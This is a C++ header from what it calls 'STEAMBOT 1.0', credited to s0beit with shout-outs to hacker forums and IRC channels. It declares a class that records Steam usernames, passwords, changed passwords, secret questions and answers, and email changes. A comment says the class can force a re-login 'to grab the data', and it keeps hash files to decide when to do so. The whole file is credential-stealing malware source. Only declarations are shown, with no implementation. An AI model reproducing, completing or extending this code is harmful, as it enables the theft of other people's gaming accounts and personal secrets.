#include <windows.h>
#include <vector>
using namespace std;

/************************************************************************************/
/* STEAMBOT 1.0 source by s0beit - greetz											*/
/* myg0t.com																		*/
/* bottalk.us																		*/
/* milw0rm.com																		*/
/* irc.lcirc.net #myg0t, #bottalk, #milw0rm											*/
/* irc.fuckurinter.net #FYINet to support me for no real reason :p					*/
/************************************************************************************/

class cSteamInfo
{
public:

	cSteamInfo();
	~cSteamInfo();

	/* used to force a login to grab the data */
	void SetRefreshLoginRequired( DWORD m_iRequired );

	/* this is used for password information exclusively */
	void OnLogin( const char *szUser, const char *szPass );
	void OnNewPass( const char *CurrentPass, const char *NewPass );
	void OnSecretQ( const char *OldQ, const char *NewQ, const char *A );
	void OnEmail( const char *szNewEmail );

	/* password hashing, used to make sure people are only */
	/* forced to login after their data has changed or */
	/* doesn't yet exist */
	void KillHashFile();
	bool HashFileExists();
	void CreatePasswordHashFile( const char *szUser, const char *szPass );
	bool PasswordFileMatch( const char *szUser, const char *szPass );
	string GetFormatString( const char *szUser, const char *szPass );
	void SetHashFilename( const char *szFilename );

	/* used to clean up */
	void ClearData();

	string Username;
	string Password;
	string OldQuestion;
	string NewQuestion;
	string QuestionAnswer;
	string Email;

	string HashFilename;

};